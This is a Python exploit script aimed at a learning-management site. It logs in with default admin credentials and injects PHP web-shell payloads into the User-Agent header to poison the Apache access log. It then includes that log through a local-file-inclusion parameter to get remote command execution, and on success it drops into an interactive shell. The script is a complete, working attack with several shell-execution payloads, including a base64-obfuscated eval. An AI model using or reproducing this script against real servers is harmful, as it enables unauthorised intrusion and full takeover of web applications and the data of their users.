import requests
import re
import sys

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()
session.timeout = 15

def login():
    print("[*] Logging in...")
    r = session.get(f"{BASE_URL}/admin/login")
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
    session.post(f"{BASE_URL}/admin/login", data={"_token": csrf, "email": ADMIN_EMAIL, "password": ADMIN_PASS})
    print("[+] Logged in")

def exploit_lfi_log_poison():
    """
    LFI + Log Poisoning RCE
    1. Inject PHP payload into User-Agent (stored in access log)
    2. Include the log file via discovered LFI to execute PHP
    """
    print("\n" + "="*60)
    print("    LFI + LOG POISONING RCE EXPLOIT")
    print("="*60)
    
    # PHP payloads to try
    payloads = [
        # Simple command execution  
        "<?php if(isset($_GET['c'])){echo '<pre>'.shell_exec($_GET['c']).'</pre>';}?>",
        # Alternative methods
        "<?php echo shell_exec($_GET['c']) ?>",
        "<?php system($_GET['c']); ?>",
        "<?php passthru($_GET['c']); ?>",
        # Encoded version to bypass potential filters
        "<?php @eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw=='));?>",
    ]
    
    lfi_url = f"{BASE_URL}/admin?view=/var/log/apache2/access.log"
    
    for i, php_payload in enumerate(payloads):
        print(f"\n[*] Attempt {i+1}: Injecting payload...")
        print(f"    Payload: {php_payload[:50]}...")
        
        # Step 1: Poison the log
        headers = {
            "User-Agent": php_payload,
            "Referer": f"{BASE_URL}/exploit_test_{i}"
        }
        
        # Make requests to inject payload into log
        session.get(f"{BASE_URL}/trigger_{i}", headers=headers)
        session.get(f"{BASE_URL}/trigger2_{i}", headers=headers)
        
        # Step 2: Include log and execute command
        test_url = f"{lfi_url}&c=id"
        print(f"    Testing: {test_url}")
        
        r = session.get(test_url)
        
        # Check for command output
        if "uid=" in r.text and ("www-data" in r.text or "apache" in r.text or "nginx" in r.text):
            print(f"\n[!!!] RCE SUCCESS!")
            print(f"[!!!] LFI URL: {lfi_url}")
            
            # Extract output
            match = re.search(r'(uid=\d+\([^)]+\)[^\n<]*)', r.text)
            if match:
                print(f"[!!!] Output: {match.group(1)}")
            
            # Interactive shell
            print("\n[*] Starting interactive shell...")
            while True:
                cmd = input("Shell> ").strip()
                if cmd.lower() in ['exit', 'quit']:
                    break
                
                r = session.get(f"{lfi_url}&c={cmd}")
                
                # Try to extract output
                if "<pre>" in r.text:
                    match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                    if match:
                        print(match.group(1))
                else:
                    # Look for output in response
                    print(f"Response length: {len(r.text)}")
            
            return True
    
    # If no direct RCE, check what's in the log
    print("\n[*] Checking log content for payload reflection...")
    r = session.get(lfi_url)
    
    # Look for PHP tags in response
    if "<?php" in r.text:
        print("[!] PHP tags found in response but not executed")
        print("[*] Log file is included as text, not parsed as PHP")
    elif "system" in r.text or "shell_exec" in r.text:
        print("[!] Payload is reflected but seems encoded/escaped")
    else:
        print("[-] Could not find payload in log")
    
    # Save response for analysis
    with open("lfi_response.html", "w", encoding="utf-8") as f:
        f.write(r.text)
    print("[*] Saved response to lfi_response.html for analysis")
    
    return False

def main():
    login()
    
    if exploit_lfi_log_poison():
        print("\n[+] Exploitation successful!")
    else:
        print("\n[-] Direct RCE via log poisoning not achieved")
        print("[*] Consider:")
        print("    1. Log file may be appended, not PHP-parsed")
        print("    2. Try different log paths")
        print("    3. Combine with other vectors")

if __name__ == "__main__":
    main()
